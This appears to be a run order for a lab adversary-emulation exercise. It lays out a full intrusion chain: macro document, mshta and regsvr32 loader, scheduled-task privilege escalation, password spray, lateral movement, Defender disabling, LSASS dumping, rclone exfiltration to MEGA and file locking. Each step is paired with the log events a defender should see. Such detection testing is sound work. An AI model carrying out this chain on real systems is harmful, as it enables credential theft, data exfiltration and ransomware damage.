# Run order

The chain is driven by the document. The operator opens it and watches; every other step is performed
by the payload or by the lab weakness described in [`gap/README.md`](../gap/README.md).

## 0. Preconditions

| Check | Where | Expected |
|---|---|---|
| C2 listener | Kali | `ss -ltn` shows 443 |
| Staging | Kali | `curl http://192.168.50.100/c0015_loader.dll` returns 200 |
| Kerberos | Kali | `klist` shows a ticket for `helpdesk@C0015.LAB` |
| Sysmon and agent | WS01, FS01 | both services running |
| Lab weakness | WS01 | `C:\ProgramData\C0015` writable by `Users`, task `C0015Updater` present |
| Victim session | WS01 | an interactive session for `duc.user`, otherwise Word cannot open the document |
| Target session | FS01 | the console session logged off, so RDP can own the single session |
| Corpus | FS01 | `C:\C0015\corpus` intact, shares `Shares` and `Backups` present |

## 1. Delivery, executed by the user

1. Copy `decree-08.03.2021.docm` to the victim desktop and open it as `duc.user`.
2. The macro writes the HTA and starts `cmd.exe /c mshta`.
3. The HTA downloads the loader and runs `regsvr32` on it.
4. The loader overwrites `C:\ProgramData\C0015\updater.exe`.
5. The scheduled task starts it as SYSTEM within a minute.

Observable: `WINWORD.EXE -> cmd.exe -> mshta.exe -> regsvr32.exe`, a write into `ProgramData`, and a
process started by the task scheduler from that path.

## 2. Everything after SYSTEM, executed by `c0015_stage2.ps1`

| Step | What it does | Observable |
|---|---|---|
| spray | tries four passwords against `\\WS01\IPC$` for `helpdesk` | several `4625`, then `4624` |
| discovery | `whoami`, `nltest`, `net view`, `tasklist /s FS01` | process creation |
| share enumeration | PowerView cradle, `Invoke-ShareFinder` | PowerShell with a download cradle |
| staging | `143.dll`, the dump tool, the locker and three `.cmd` files over `C$` | `4624` on the target, file writes |
| loader | `wmic /node:FS01 ... rundll32 143.dll` | `WmiPrvSE.exe -> rundll32.exe` |
| foothold | `C0015Persist`, onstart, SYSTEM | `4698`, task XML |
| defence | real-time protection off on the target | Defender events |
| injection | `inject.cmd` against the per-user service host | `E8` into `svchost.exe` |
| dump | `dump.cmd`, output to `dump.txt` | `E10` into `lsass.exe` |
| exfiltration | rclone over `\\FS01\Shares` to MEGA | the rclone command line |
| impact | `locker.bat` on the target | notes and renamed files |

## 3. Interactive stage, executed by the operator

1. Log the console session off on FS01 so RDP can own the only session.
2. `kinit helpdesk@C0015.LAB`, then
   `xfreerdp /v:192.168.50.30 /u:helpdesk /d:C0015.LAB /sec:nla`.
3. Within the session, `taskmgr /4` from the shell.

Observable: `4624` type 10 for `helpdesk`, a `rdp-tcp` session, `taskmgr.exe` with parent
`explorer.exe`.

## 4. After the run

Collect the alerts for the window, compare them with the table in
[`killchain/README.md`](../killchain/README.md), then restore the corpus and remove the staged files.
